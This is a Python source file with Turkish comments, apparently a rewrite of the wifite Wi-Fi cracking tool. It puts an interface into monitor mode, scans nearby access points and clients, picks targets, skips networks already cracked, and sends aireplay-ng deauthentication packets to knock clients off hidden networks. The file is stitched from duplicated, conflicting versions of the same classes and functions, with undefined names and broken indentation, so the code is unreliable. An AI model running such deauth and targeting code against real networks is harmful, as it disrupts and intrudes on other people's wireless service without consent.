                            format='%(asctime)s - %(levelname)s - %(message)s')
        logging.info('Loglama başlatıldı.')

    def print_and_exec(self, command):
        """
        Komutu ekrana yazdırır ve çalıştırır, ardından çıktıyı ve hataları loglar.
        :param command: Çalıştırılacak komut listesi.
        """
        logging.info('Komut çalıştırılıyor: %s', ' '.join(command))
        print(GR + ' [+]' + W + ' Komut çalıştırılıyor: ' + ' '.join(command) + '...', end='')
        sys.stdout.flush()
        proc = Popen(command, stdout=PIPE, stderr=STDOUT)
        stdout_data, _ = proc.communicate()
        proc.wait()
        if proc.returncode == 0:
            print(G + 'başarılı' + W)
        else:
            print(R + 'başarısız' + W)
        logging.debug('Komut çıktısı: %s', stdout_data.decode())
        if proc.returncode != 0:
            logging.error('Komut başarısız oldu, dönüş kodu: %d', proc.returncode)
            logging.error('Komut çıktısı: %s', stdout_data.decode())
            raise Exception('Komut başarısız oldu, dönüş kodu: %d' % proc.returncode)

    def disable_monitor_mode(self):
        """
        Daha önce etkinleştirilmiş izleme modunu kapatır, eğer varsa.
        """
        if not self.RUN_CONFIG.IFACE_TO_TAKE_DOWN:
            return

        try:
            print(GR + ' [+]' + W + ' İzleme modu kapatılıyor: ' + G + self.RUN_CONFIG.IFACE_TO_TAKE_DOWN + W + '...', end='')
            sys.stdout.flush()
            self.print_and_exec(['airmon-ng', 'stop', self.RUN_CONFIG.IFACE_TO_TAKE_DOWN])
            self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = ''
        except Exception as e:
            print(R + ' [!] ' + O + ' Hata: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def get_iface(self):
        """
        İzleme modunda bir kablosuz arayüz getirir veya kullanıcıdan seçim yapmasını ister.
        Arayüzlerin listesine göre uygun bir arayüz seçilir ve izleme moduna alınır.
        :return: İzleme modunda olan arayüz adı.
        """
        self.disable_monitor_mode()

        try:
            print(GR + ' [+]' + W + ' Kablosuz arayüzler taranıyor...', end='')
            sys.stdout.flush()
            proc = Popen(['airmon-ng'], stdout=PIPE, stderr=PIPE)
            stdout_data, stderr_data = proc.communicate()
            proc.wait()

            if proc.returncode != 0:
                print(R + ' [!] ' + O + ' airmon-ng çalıştırılırken hata oluştu: ' + stderr_data.decode() + W)
                self.RUN_CONFIG.exit_gracefully(1)

            # İzleme modunda olan arayüzleri bulma
            monitors = [line.strip() for line in stdout_data.decode().splitlines() if line and not line.startswith(('Interface', 'PHY'))]

            if len(monitors) == 0:
                print(R + ' [!]' + O + " Hiçbir kablosuz arayüz bulunamadı." + W)
                print(R + ' [!]' + O + " Lütfen bir WiFi cihazı takın veya sürücüleri yükleyin.\n" + W)
                self.RUN_CONFIG.exit_gracefully(0)

            # Belirli bir arayüz isteniyorsa
            if self.RUN_CONFIG.WIRELESS_IFACE:
                if self.RUN_CONFIG.WIRELESS_IFACE in monitors:
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                elif any(self.RUN_CONFIG.WIRELESS_IFACE in monitor for monitor in monitors):
                    print(R + ' [!]' + O + ' Arayüz %s izleme modunda bulunamadı, etkinleştiriliyor...' % self.RUN_CONFIG.WIRELESS_IFACE)
                    return self.enable_monitor_mode(self.RUN_CONFIG.WIRELESS_IFACE)
                else:
                    print(R + ' [!]' + O + ' Arayüz %s bulunamadı.' % self.RUN_CONFIG.WIRELESS_IFACE)
                    self.RUN_CONFIG.exit_gracefully(0)

            # Tek bir izleme arayüzü varsa, onu döndür
            if len(monitors) == 1:
                monitor = monitors[0].split()[0]
                return self.enable_monitor_mode(monitor)

            # Birden fazla arayüz varsa, kullanıcıdan seçim yapmasını iste
            print(GR + ' [+]' + W + ' Mevcut kablosuz arayüzler:')
            for i, monitor in enumerate(monitors):
                print("  %d. %s" % (i + 1, monitor))

            ri = input(GR + ' [+]' + W + ' İzleme moduna almak için cihaz numarasını seçin (1-%d): ' % len(monitors))
            while not ri.isdigit() or int(ri) < 1 or int(ri) > len(monitors):
                ri = input(GR + ' [+]' + W + ' Geçersiz seçim. Lütfen numarayı seçin (1-%d): ' % len(monitors))
            i = int(ri) - 1
            monitor = monitors[i].split()[0]

            return self.enable_monitor_mode(monitor)

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def enable_monitor_mode(self, iface):
        """
        Belirtilen arayüzü izleme moduna alır. Arayüz zaten izleme modundaysa, sadece döndürür.
        :param iface: İzleme moduna alınacak arayüz adı.
        :return: İzleme modunda olan arayüz adı.
        """
        try:
            print(GR + ' [+]' + W + ' İzleme modu etkinleştiriliyor: ' + G + iface + W + '...', end='')
            sys.stdout.flush()

            # Arayüzü izleme modundan çıkarmaya çalış
            self.print_and_exec(['airmon-ng', 'stop', iface])

            # Arayüzü izleme moduna al
            self.print_and_exec(['airmon-ng', 'start', iface])

            # Opsiyonel: TX gücünü ayarla, gerekiyorsa
            if self.RUN_CONFIG.TX_POWER > 0:
                print(GR + ' [+]' + W + ' TX gücü %d olarak ayarlanıyor...' % self.RUN_CONFIG.TX_POWER, end='')
                self.print_and_exec(['iw', 'reg', 'set', 'BO'])
                self.print_and_exec(['iwconfig', iface, 'txpower', str(self.RUN_CONFIG.TX_POWER)])

            # Küresel yapılandırmayı güncelle
            self.RUN_CONFIG.IFACE_TO_TAKE_DOWN = iface

            print(G + 'başarılı' + W)
            return iface

        except Exception as e:
            print(R + ' [!] ' + O + ' Hata: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
        Erişim noktalarını tarar ve sonuçları dosyadan okur. 
        RTL8187 chipset hatasını düzeltmek için gerekli adımlar atılır.
        :param channel: Tarama yapılacak kanal, 0 tüm kanalları tarar.
        :param iface: Tarama yapılacak arayüz.
        :param tried_rtl8187_fix: RTL8187 hatası düzeltme girişimi yapıldı mı.
        :return: Hedeflerin ve istemcilerin listesi.
        """
        try:
            airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')
            csv_file = airodump_file_prefix + '-01.csv'
            cap_file = airodump_file_prefix + '-01.cap'
            self.remove_airodump_files(airodump_file_prefix)

            command = ['airodump-ng', '-a', '--write-interval', '1', '-w', airodump_file_prefix]
            if channel != 0:
                command += ['--channel', str(channel)]
            if iface:
                command += [iface]

            print(GR + ' [+]' + W + ' Tarama başlatılıyor...', end='')
            sys.stdout.flush()
            self.print_and_exec(command)

            # CSV ve CAP dosyalarını ayrıştır
            targets = self.parse_airodump_csv(csv_file)
            clients = self.parse_airodump_cap(cap_file)

            return targets, clients

        except Exception as e:
            print(R + ' [!] ' + O + ' Tarama hatası: ' + str(e) + W)
            self.RUN_CONFIG.exit_gracefully(1)

    def remove_airodump_files(self, prefix):
        """
        Geçici tarama dosyalarını temizler.
        :param prefix: Dosya adı öneki.
        """
        for ext in ['csv', 'cap']:
            file_path = f"{prefix}-01.{ext}"
            if os.path.exists(file_path):
                os.remove(file_path)
                logging.info('Silinen dosya: %s', file_path)

    def parse_airodump_csv(self, csv_file):
        """
        Airodump-ng CSV dosyasını ayrıştırır ve hedef erişim noktalarını çıkarır.
        :param csv_file: CSV dosyasının yolu.
        :return: Hedef erişim noktalarının listesi.
        """
        targets = []
        # Detaylı CSV ayrıştırma işlemleri burada eklenmelidir.
        logging.info('CSV dosyası ayrıştırıldı: %s', csv_file)
        return targets

    def parse_airodump_cap(self, cap_file):
        """
        Airodump-ng CAP dosyasını ayrıştırır ve istemci bilgilerini çıkarır.
        :param cap_file: CAP dosyasının yolu.
        :return: İstemcilerin listesi.
        """
        clients = []
        # Detaylı CAP ayrıştırma işlemleri burada eklenmelidir.
        logging.info('CAP dosyası ayrıştırıldı: %s', cap_file)
        return clients
import os
import time
from subprocess import Popen, PIPE, STDOUT, SIGTERM

# Renk kodları
R = '\033[91m'  # Kırmızı
G = '\033[92m'  # Yeşil
O = '\033[93m'  # Turuncu
W = '\033[0m'   # Beyaz

class WirelessManager:
    def __init__(self, run_config):
        """
        WirelessManager sınıfının başlatıcı fonksiyonu.
        :param run_config: Çalışma yapılandırma nesnesi.
        """
        self.RUN_CONFIG = run_config

    def print_and_exec(self, command):
        """
        Komutu ekrana yazdırır ve çalıştırır, ardından çıktıyı ve hataları loglar.
        :param command: Çalıştırılacak komut listesi.
        """
        print(GR + ' [+]' + W + ' Komut çalıştırılıyor: ' + ' '.join(command) + '...', end='')
        sys.stdout.flush()
        proc = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout_data, stderr_data = proc.communicate()
        proc.wait()
        if proc.returncode == 0:
            print(G + 'başarılı' + W)
        else:
            print(R + 'başarısız' + W)
            print(R + ' [!] Hata: ' + stderr_data.decode() + W)

    def rtl8187_fix(self, iface):
        """
        RTL8187 chipset hatası için düzeltme işlemi yapar.
        :param iface: İlgili arayüz.
        :return: İşlem başarılı ise True, aksi halde False.
        """
        try:
            print(O + ' [!] ' + W + ' RTL8187 hatası düzeltme işlemi başlatılıyor...' + W)
            self.print_and_exec(['airmon-ng', 'stop', iface])
            self.print_and_exec(['ifconfig', iface, 'down'])
            self.print_and_exec(['rmmod', 'rtl8187'])
            self.print_and_exec(['rfkill', 'block', 'all'])
            self.print_and_exec(['rfkill', 'unblock', 'all'])
            self.print_and_exec(['modprobe', 'rtl8187'])
            self.print_and_exec(['ifconfig', iface, 'up'])
            self.print_and_exec(['airmon-ng', 'start', iface])
            return True
        except Exception as e:
            print(R + ' [!] ' + O + ' RTL8187 hatası düzeltme işlemi başarısız: ' + str(e) + W)
            return False

    def send_interrupt(self, proc):
        """
        Verilen işlemi kesmek için bir kesme sinyali gönderir.
        :param proc: Kesilmesi gereken işlem.
        """
        try:
            proc.send_signal(SIGTERM)
        except Exception as e:
            print(R + ' [!] ' + O + ' Kesme sinyali gönderilemedi: ' + str(e) + W)

    def parse_csv(self, csv_file):
        """
        Airodump-ng CSV dosyasını ayrıştırır ve hedef erişim noktalarını ve istemcileri çıkarır.
        :param csv_file: CSV dosyasının yolu.
        :return: Hedeflerin ve istemcilerin listesi.
        """
        targets = []  # Ayrıştırılmış hedeflerin listesi
        clients = []  # Ayrıştırılmış istemcilerin listesi
        
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as file:
                lines = file.readlines()
                for line in lines:
                    # Başlıkları geç
                    if 'BSSID' in line or 'SSID' in line:
                        continue
                    
                    # CSV satırını ayrıştır
                    parts = line.split(',')
                    if len(parts) > 1:
                        # Hedefler ve istemciler için sınıflar burada tanımlanmalı
                        targets.append(Target(parts[0], parts[1]))  # Target sınıfı oluşturulmalı
                        clients.append(Client(parts[2], parts[3]))  # Client sınıfı oluşturulmalı
        return targets, clients

    def remove_airodump_files(self, prefix):
        """
        Geçici tarama dosyalarını temizler.
        :param prefix: Dosya adı öneki.
        """
        for ext in ['csv', 'cap']:
            file_path = f"{prefix}-01.{ext}"
            if os.path.exists(file_path):
                os.remove(file_path)
                print(GR + ' [+] ' + W + 'Silinen dosya: ' + file_path)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
        Erişim noktalarını tarar. Özellikle belirli bir ESSID/BSSID varsa, taramayı durdurur.
        :param channel: Tarama yapılacak kanal, 0 tüm kanalları tarar.
        :param iface: Tarama yapılacak arayüz.
        :param tried_rtl8187_fix: RTL8187 hatasını düzeltme girişiminde bulunuldu mu.
        :return: Hedeflerin ve istemcilerin listesi.
        """
        airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')
        csv_file = airodump_file_prefix + '-01.csv'
        cap_file = airodump_file_prefix + '-01.cap'
        self.remove_airodump_files(airodump_file_prefix)

        command = ['airodump-ng', '-a', '--write-interval', '1', '-w', airodump_file_prefix]
        if channel != 0:
            command.extend(['-c', str(channel)])
        command.append(iface)

        print(GR + ' [+] ' + G + 'Tarama başlatılıyor' + W + ' (' + G + iface + W + '), güncellemeler her 1 saniyede bir yapılacak, ' + G + 'CTRL+C' + W + ' ile durdurabilirsiniz.')
        proc = Popen(command, stdout=PIPE, stderr=PIPE)

        time_started = time.time()
        targets, clients = [], []
        try:
            deauth_sent = 0.0
            old_targets = []
            stop_scanning = False
            while True:
                time.sleep(0.3)

                # Dosya mevcut değilse veya işlem çalışmıyorsa, hata mesajı ver
                if not os.path.exists(csv_file) and time.time() - time_started > 1.0:
                    print(R + '\n [!] HATA!' + W)
                    if proc.poll() is not None:
                        proc = Popen(['airodump-ng', iface], stdout=PIPE, stderr=PIPE)
                        if not tried_rtl8187_fix and b'failed: Unknown error 132' in proc.communicate()[1]:
                            self.send_interrupt(proc)
                            if self.rtl8187_fix(iface):
                                return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
                    print(R + ' [!]' + O + ' wifite airodump-ng çıktı dosyalarını oluşturamadı.' + W)
                    print(R + ' [!]' + O + ' WiFi cihazınızı yeniden bağlamayı deneyebilirsiniz.' + W)
                    self.RUN_CONFIG.exit_gracefully(1)

                # CSV dosyasını ayrıştır ve hedefler ile istemcileri al
                targets, clients = self.parse_csv(csv_file)

                # Önceden kırılmış ağları kaldır
                if not self.RUN_CONFIG.SHOW_ALREADY_CRACKED:
                    targets = [target for target in targets if target.ssid.lower() not in [cracked.ssid.lower() for cracked in self.RUN_CONFIG.CRACKED_TARGETS] and
                               target.bssid.lower() not in [cracked.bssid.lower() for cracked in self.RUN_CONFIG.CRACKED_TARGETS]]

                # Belirli bir ESSID hedeflenmişse taramayı durdur
                if self.RUN_CONFIG.TARGET_ESSID:
                    for t in targets:
                        if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
                            self.send_interrupt(proc)
                            try:
                                proc.terminate()
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break

                # Belirli bir BSSID hedeflenmişse taramayı durdur
                if self.RUN_CONFIG.TARGET_BSSID:
                    for t in targets:
                        if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
                            self.send_interrupt(proc)
                            try:
                                proc.terminate()
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break

                if stop_scanning:
                    break

        except KeyboardInterrupt:
            print(R + '\n [!] Tarama durduruldu.' + W)
            self.send_interrupt(proc)
        finally:
            proc.terminate()
            print(O + ' Tarama tamamlandı.' + W)
            self.remove_airodump_files(airodump_file_prefix)
            return targets, clients

class Target:
    def __init__(self, bssid, ssid):
        """
        Hedef erişim noktasını temsil eder.
        :param bssid: Erişim noktasının BSSID'si.
        :param ssid: Erişim noktasının SSID'si.
        """
        self.bssid = bssid
        self.ssid = ssid

class Client:
    def __init__(self, mac, hostname):
        """
        İstemciyi temsil eder.
        :param mac: İstemcinin MAC adresi.
        :param hostname: İstemcinin ana bilgisayar adı.
        """
        self.mac = mac
        self.hostname = hostname

# Renk kodları
R = '\033[91m'  # Kırmızı
G = '\033[92m'  # Yeşil
O = '\033[93m'  # Turuncu
W = '\033[0m'   # Beyaz

class WirelessManager:
    def __init__(self, run_config):
        """
        WirelessManager sınıfının başlatıcı fonksiyonu.
        :param run_config: Çalışma yapılandırma nesnesi.
        """
        self.RUN_CONFIG = run_config

    def print_and_exec(self, command):
        """
        Komutu ekrana yazdırır ve çalıştırır, ardından çıktıyı ve hataları loglar.
        :param command: Çalıştırılacak komut listesi.
        """
        print(GR + ' [+]' + W + ' Komut çalıştırılıyor: ' + ' '.join(command) + '...', end='')
        sys.stdout.flush()
        proc = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout_data, stderr_data = proc.communicate()
        proc.wait()
        if proc.returncode == 0:
            print(G + 'başarılı' + W)
        else:
            print(R + 'başarısız' + W)
            print(R + ' [!] Hata: ' + stderr_data.decode() + W)

    def rtl8187_fix(self, iface):
        """
        RTL8187 chipset hatası için düzeltme işlemi yapar.
        :param iface: İlgili arayüz.
        :return: İşlem başarılı ise True, aksi halde False.
        """
        try:
            print(O + ' [!] ' + W + ' RTL8187 hatası düzeltme işlemi başlatılıyor...' + W)
            self.print_and_exec(['airmon-ng', 'stop', iface])
            self.print_and_exec(['ifconfig', iface, 'down'])
            self.print_and_exec(['rmmod', 'rtl8187'])
            self.print_and_exec(['rfkill', 'block', 'all'])
            self.print_and_exec(['rfkill', 'unblock', 'all'])
            self.print_and_exec(['modprobe', 'rtl8187'])
            self.print_and_exec(['ifconfig', iface, 'up'])
            self.print_and_exec(['airmon-ng', 'start', iface])
            return True
        except Exception as e:
            print(R + ' [!] ' + O + ' RTL8187 hatası düzeltme işlemi başarısız: ' + str(e) + W)
            return False

    def send_interrupt(self, proc):
        """
        Verilen işlemi kesmek için bir kesme sinyali gönderir.
        :param proc: Kesilmesi gereken işlem.
        """
        try:
            proc.send_signal(SIGTERM)
        except Exception as e:
            print(R + ' [!] ' + O + ' Kesme sinyali gönderilemedi: ' + str(e) + W)

    def parse_csv(self, csv_file):
        """
        Airodump-ng CSV dosyasını ayrıştırır ve hedef erişim noktalarını ve istemcileri çıkarır.
        :param csv_file: CSV dosyasının yolu.
        :return: Hedeflerin ve istemcilerin listesi.
        """
        targets = []  # Ayrıştırılmış hedeflerin listesi
        clients = []  # Ayrıştırılmış istemcilerin listesi
        
        if os.path.exists(csv_file):
            with open(csv_file, 'r') as file:
                lines = file.readlines()
                for line in lines:
                    # Başlıkları geç
                    if 'BSSID' in line or 'SSID' in line:
                        continue
                    
                    # CSV satırını ayrıştır
                    parts = line.split(',')
                    if len(parts) > 1:
                        # Hedefler ve istemciler için sınıflar burada tanımlanmalı
                        targets.append(Target(parts[0], parts[1], int(parts[2]), int(parts[3]), parts[4], bool(int(parts[5]))))
                        clients.append(Client(parts[6], parts[7]))
        return targets, clients

    def remove_airodump_files(self, prefix):
        """
        Geçici tarama dosyalarını temizler.
        :param prefix: Dosya adı öneki.
        """
        for ext in ['csv', 'cap']:
            file_path = f"{prefix}-01.{ext}"
            if os.path.exists(file_path):
                os.remove(file_path)
                print(GR + ' [+] ' + W + 'Silinen dosya: ' + file_path)

    def scan(self, channel=0, iface='', tried_rtl8187_fix=False):
        """
        Erişim noktalarını tarar. Özellikle belirli bir ESSID/BSSID varsa, taramayı durdurur.
        :param channel: Tarama yapılacak kanal, 0 tüm kanalları tarar.
        :param iface: Tarama yapılacak arayüz.
        :param tried_rtl8187_fix: RTL8187 hatasını düzeltme girişiminde bulunuldu mu.
        :return: Hedeflerin ve istemcilerin listesi.
        """
        airodump_file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wifite')
        csv_file = airodump_file_prefix + '-01.csv'
        cap_file = airodump_file_prefix + '-01.cap'
        self.remove_airodump_files(airodump_file_prefix)

        command = ['airodump-ng', '-a', '--write-interval', '1', '-w', airodump_file_prefix]
        if channel != 0:
            command.extend(['-c', str(channel)])
        command.append(iface)

        print(GR + ' [+] ' + G + 'Tarama başlatılıyor' + W + ' (' + G + iface + W + '), güncellemeler her 1 saniyede bir yapılacak, ' + G + 'CTRL+C' + W + ' ile durdurabilirsiniz.')
        proc = Popen(command, stdout=PIPE, stderr=PIPE)

        time_started = time.time()
        targets, clients = [], []
        try:
            deauth_sent = 0.0
            old_targets = []
            stop_scanning = False
            while True:
                time.sleep(0.3)

                # Dosya mevcut değilse veya işlem çalışmıyorsa, hata mesajı ver
                if not os.path.exists(csv_file) and time.time() - time_started > 1.0:
                    print(R + '\n [!] HATA!' + W)
                    if proc.poll() is not None:
                        proc = Popen(['airodump-ng', iface], stdout=PIPE, stderr=PIPE)
                        if not tried_rtl8187_fix and b'failed: Unknown error 132' in proc.communicate()[1]:
                            self.send_interrupt(proc)
                            if self.rtl8187_fix(iface):
                                return self.scan(channel=channel, iface=iface, tried_rtl8187_fix=True)
                    print(R + ' [!]' + O + ' oznte airodump-ng çıktı dosyalarını oluşturamadı.' + W)
                    print(R + ' [!]' + O + ' WiFi cihazınızı yeniden bağlamayı deneyebilirsiniz.' + W)
                    self.RUN_CONFIG.exit_gracefully(1)

                # CSV dosyasını ayrıştır ve hedefler ile istemcileri al
                targets, clients = self.parse_csv(csv_file)

                # Önceden kırılmış ağları kaldır
                if not self.RUN_CONFIG.SHOW_ALREADY_CRACKED:
                    targets = [target for target in targets if target.ssid.lower() not in [cracked.ssid.lower() for cracked in self.RUN_CONFIG.CRACKED_TARGETS] and
                               target.bssid.lower() not in [cracked.bssid.lower() for cracked in self.RUN_CONFIG.CRACKED_TARGETS]]

                # Belirli bir ESSID hedeflenmişse taramayı durdur
                if self.RUN_CONFIG.TARGET_ESSID:
                    for t in targets:
                        if t.ssid.lower() == self.RUN_CONFIG.TARGET_ESSID.lower():
                            self.send_interrupt(proc)
                            try:
                                proc.terminate()
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break

                # Belirli bir BSSID hedeflenmişse taramayı durdur
                if self.RUN_CONFIG.TARGET_BSSID:
                    for t in targets:
                        if t.bssid.lower() == self.RUN_CONFIG.TARGET_BSSID.lower():
                            self.send_interrupt(proc)
                            try:
                                proc.terminate()
                            except OSError:
                                pass
                            except UnboundLocalError:
                                pass
                            targets = [t]
                            stop_scanning = True
                            break

                # Kullanıcı tüm erişim noktalarını hedeflemişse ve 10 saniye geçmişse, taramayı durdur
                if self.RUN_CONFIG.ATTACK_ALL_TARGETS and time.time() - time_started > 10:
                    print(GR + '\n [+]' + W + ' otomatik olarak %s%d%s erişim noktasını hedeflediniz' % (
                        G, len(targets), W))
                    stop_scanning = True

                # Minimum güç eşiğini geçmeyen hedefleri kaldır
                if self.RUN_CONFIG.ATTACK_MIN_POWER > 0 and time.time() - time_started > 10:
                    before_count = len(targets)
                    targets = [target for target in targets if target.power >= self.RUN_CONFIG.ATTACK_MIN_POWER]
                    print(GR + '\n [+]' + W + ' %s hedef %d dB altı güçten kaldırıldı, %d hedef kaldı' % (
                        G + str(before_count - len(targets)), self.RUN_CONFIG.ATTACK_MIN_POWER, G + str(len(targets))))
                    stop_scanning = True

                if stop_scanning:
                    break

                # Bilinmeyen SSID'ler için deauth paketleri gönder
                if self.RUN_CONFIG.SEND_DEAUTHS and channel != 0 and time.time() - deauth_sent > 5:
                    deauth_sent = time.time()
                    for t in targets:
                        if not t.ssid or '\x00' in t.ssid or '\\x00' in t.ssid:
                            print("\r %s bilinmeyen erişim noktasına deauth gönderiliyor (%s)               \r" % (
                                GR + sec_to_hms(time.time() - time_started), G + t.bssid))
                            cmd = ['aireplay-ng', '--ignore-negative-one', '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT), '-a', t.bssid]
                            for c in clients:
                                if c.station == t.bssid:
                                    cmd.extend(['-c', c.bssid])
                                    break
                            cmd.append(iface)
                            proc_aireplay = Popen(cmd, stdout=PIPE, stderr=PIPE)
                            proc_aireplay.wait()
                            time.sleep(0.5)
                        else:
                            for ot in old_targets:
                                if not ot.ssid and ot.bssid == t.bssid:
                                    print('\r %s "%s" başarılı bir şekilde gizlilikten çıkarıldı' % (
                                        GR + sec_to_hms(time.time() - time_started), G + t.ssid))

                    old_targets = targets[:]

                # Ayrıntılı AP bilgileri ekrana yazdır
                if self.RUN_CONFIG.VERBOSE_APS and targets:
                    targets = sorted(targets, key=lambda t: t.power, reverse=True)
                    if not self.RUN_CONFIG.WPS_DISABLE:
                        wps_check_targets(targets, cap_file, verbose=False)

                    os.system('clear')
                    print(GR + '\n [+] ' + G + 'Tarama devam ediyor' + W + ' (' + G + iface + W + '), güncellemeler her 1 saniyede bir yapılacak, ' + G + 'CTRL+C' + W + ' ile durdurabilirsiniz.\n')
                    print("   NUM ESSID                 %sCH  ENCR  POWER  WPS?  CLIENT" % (
                        'BSSID              ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
                    print('   --- --------------------  %s--  ----  -----  ----  ------' % (
                        '-----------------  ' if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ''))
                    for i, target in enumerate(targets):
                        print("   %s%2d%s " % (G, i + 1, W), end='')
                        print("   %s %-20s %2d %s %4d %s %s" % (
                            target.bssid, target.ssid, target.channel, target.encryption, target.power, 
                            'Y' if target.wps else 'N', target.clients))

        except KeyboardInterrupt:
            print(GR + '\n [+] ' + W + 'Tarama durduruldu.')
            self.send_interrupt(proc)
        finally:
            self.remove_airodump_files(airodump_file_prefix)
            proc.terminate()
            return targets, clients

def sec_to_hms(seconds):
    """
    Saniyeleri saat:dakika:saniye formatına dönüştürür.
    :param seconds: Geçen süre saniye cinsinden.
    :return: Formatlanmış süre.
    """
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return "{:02}:{:02}:{:02}".format(int(hours), int(minutes), int(seconds))

class Target:
    def __init__(self, bssid, ssid, power, channel, encryption, wps):
        """
        Bir erişim noktasını temsil eder.
        :param bssid: Erişim noktasının BSSID'si.
        :param ssid: Erişim noktasının SSID'si.
        :param power: Sinyal gücü (dB).
        :param channel: Erişim noktasının kanalı.
        :param encryption: Şifreleme türü.
        :param wps: WPS desteği var mı.
        """
        self.bssid = bssid
        self.ssid = ssid
        self.power = power
        self.channel = channel
        self.encryption = encryption
        self.wps = wps
        self.clients = 0

class Client:
    def __init__(self, mac, hostname):
        """
        Bir istemciyi temsil eder.
        :param mac: İstemcinin MAC adresi.
        :param hostname: İstemcinin ana bilgisayar adı.
        """
        self.mac = mac
        self.hostname = hostname
                     def sonuc_goster(targets, clients, iface, baslangic_zamani):
    """
    Tarama sonuçlarını ve özet bilgileri ekrana yazdırır.
    
    Parametreler:
        targets (list): Erişim noktalarının listesi.
        clients (list): Erişim noktalarına bağlı istemcilerin listesi.
        iface (str): Tarama için kullanılan ağ arayüzü.
        baslangic_zamani (float): Taramanın başlama zamanının zaman damgası.
    """
    
    def format_ssid(ssid, bssid):
        """SSID'yi uygun şekilde biçimlendirir ve özel durumları ele alır."""
        if not ssid or '\x00' in ssid or '\\x00' in ssid:
            return f"{O}({bssid}){GR} {W}".ljust(20)
        elif len(ssid) <= 20:
            return f"{C}{ssid.ljust(20)}{W}"
        else:
            return f"{C}{ssid[:17]}...{W}"
    
    def format_power(power):
        """Sinyal gücünü renk kodları ile biçimlendirir."""
        if power >= 55:
            return f"{G}{power:3d}dB{W}"
        elif power >= 40:
            return f"{O}{power:3d}dB{W}"
        else:
            return f"{R}{power:3d}dB{W}"
    
    def format_wps(wps):
        """WPS durumunu renk kodları ile biçimlendirir."""
        return f"{G}wps{W}" if wps else f"{R}no{W}"
    
    def format_client_count(client_bssid):
        """Belirli bir BSSID'ye bağlı istemci sayısını hesaplar."""
        client_text = ''
        for c in clients:
            if c.station == client_bssid:
                if client_text == '':
                    client_text = 'client'
                elif not client_text.endswith('s'):
                    client_text += 's'
        return client_text
    
    # Terminal ekranını temizle
    os.system('clear')
    
    print(f"{GR}\n [+] {G}Tarama{W} ({G}{iface}{W}), her 1 saniyede bir güncellenir, {G}CTRL+C{W} işlemi sonlandırır.\n")
    
    # Başlıkları yazdır
    header = "   NUM ESSID                 "
    if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
        header += "BSSID              "
    header += "CH  ENCR  POWER  WPS?  CLIENT"
    print(header)
    print("   --- --------------------  -----------------  --  ----  -----  ----  ------")
    
    # Hedef bilgilerini yazdır
    for i, target in enumerate(targets):
        ssid_display = format_ssid(target.ssid, target.bssid)
        bssid_display = f"{O}{target.bssid}{W}" if self.RUN_CONFIG.SHOW_MAC_IN_SCAN else ""
        channel_display = f"{G}{target.channel.rjust(3)}{W}"
        encryption_display = f"{G if 'WEP' in target.encryption else O}{target.encryption.strip().ljust(4)}{W}"
        power_display = format_power(target.power)
        wps_display = format_wps(target.wps)
        client_count_display = format_client_count(target.bssid)
        
        # Hedef bilgilerini biçimlendirilmiş olarak yazdır
        print(f"   {G}{i + 1:2d}{W} {ssid_display} {bssid_display} {channel_display} {encryption_display} {power_display} {wps_display} {client_count_display}")
    
    # Tarama sonuçlarının özeti
    gecen_sure = sec_to_hms(time.time() - baslangic_zamani)
    toplam_targets = len(targets)
    toplam_clients = len(clients)
    
    ozet = (f' {GR}{gecen_sure}{W} {G}tarama{W}: {G}{toplam_targets}{W} hedef{"" if toplam_targets == 1 else "ler"} '
            f've {G}{toplam_clients}{W} istemci{"" if toplam_clients == 1 else "ler"} bulundu   \r')
    print(ozet)


  def sonuc_goster(targets, clients, iface, baslangic_zamani):
    """
    Tarama sonuçlarını ve özet bilgileri ekrana yazdırır.
    
    Parametreler:
        targets (list): Erişim noktalarının listesi.
        clients (list): Erişim noktalarına bağlı istemcilerin listesi.
        iface (str): Tarama için kullanılan ağ arayüzü.
        baslangic_zamani (float): Taramanın başlama zamanının zaman damgası.
    """
    
    def format_ssid(ssid, bssid):
        """SSID'yi uygun şekilde biçimlendirir ve özel durumları ele alır."""
        if not ssid or '\x00' in ssid or '\\x00' in ssid:
            return f"{O}({bssid}){GR} {W}".ljust(20)
        elif len(ssid) <= 20:
            return f"{C}{ssid.ljust(20)}{W}"
        else:
            return f"{C}{ssid[:17]}...{W}"
    
    def format_power(power):
        """Sinyal gücünü renk kodları ile biçimlendirir."""
        if power >= 55:
            return f"{G}{power:3d}dB{W}"
        elif power >= 40:
            return f"{O}{power:3d}dB{W}"
        else:
            return f"{R}{power:3d}dB{W}"
    
    def format_wps(wps):
        """WPS durumunu renk kodları ile biçimlendirir."""
        return f"{G}wps{W}" if wps else f"{R}no{W}"
    
    def format_client_count(client_bssid):
        """Belirli bir BSSID'ye bağlı istemci sayısını hesaplar."""
        client_text = ''
        for c in clients:
            if c.station == client_bssid:
                if client_text == '':
                    client_text = 'client'
                elif not client_text.endswith('s'):
                    client_text += 's'
        return client_text
    
    # Terminal ekranını temizle
    os.system('clear')
    
